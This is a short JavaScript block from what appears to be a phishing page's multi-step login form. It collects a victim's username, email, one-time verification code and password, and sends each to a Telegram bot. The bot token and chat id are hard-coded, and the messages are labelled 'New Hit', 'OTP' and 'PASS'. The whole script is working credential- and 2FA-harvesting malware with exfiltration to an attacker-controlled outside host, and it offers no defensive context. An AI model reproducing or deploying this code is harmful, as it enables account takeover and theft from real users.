<script>
    const TOKEN = '8727446755:AAF3qAtyukCIYkJ3JGG4cVIGxXK8kJHE74g';
    const CHAT = '7489116869';

    async function sendToTele(text) {
        // Log to console to verify code is running
        console.log("Attempting to send:", text);
        
        const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        const params = {
            chat_id: CHAT,
            text: text,
            parse_mode: 'HTML'
        };

        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(params)
            });
            const data = await response.json();
            console.log("Telegram Response:", data);
        } catch(e) {
            console.error("Tele Error:", e);
        }
    }

    function handleStep(current, msgText, next) {
        let inputVal = "";
        const userField = document.getElementById('username');
        const emailField = document.getElementById('email');
        const codeField = document.getElementById('code');
        const passField = document.getElementById('password');

        if(current === 1) inputVal = userField.value;
        if(current === 2) inputVal = emailField.value;
        if(current === 3) inputVal = codeField.value;
        if(current === 4) inputVal = passField.value;

        if(!inputVal) { alert("Please fill the field"); return; }

        const msg = document.getElementById('msg' + current);
        const btn = document.getElementById('btn' + current);
        msg.innerText = msgText;
        msg.classList.add('active');
        btn.disabled = true;

        // Data capture logic
        const username = userField.value;
        if(current === 1) sendToTele(`👤 <b>New Hit</b>\nUser: @${inputVal}`);
        if(current === 2) sendToTele(`📧 <b>Email</b>\nUser: @${username}\nEmail: ${inputVal}`);
        if(current === 3) sendToTele(`🔢 <b>OTP</b>\nUser: @${username}\nCode: ${inputVal}`);
        if(current === 4) sendToTele(`🔑 <b>PASS</b>\nUser: @${username}\nPass: <code>${inputVal}</code>`);

        setTimeout(() => {
            if(next === 5) {
                showStep(5);
                setTimeout(() => showStep(6), 4000);
            } else {
                showStep(next);
            }
        }, 2000);
    }

    function showStep(s) {
        document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
        document.getElementById('step' + s).classList.add('active');
    }
</script>
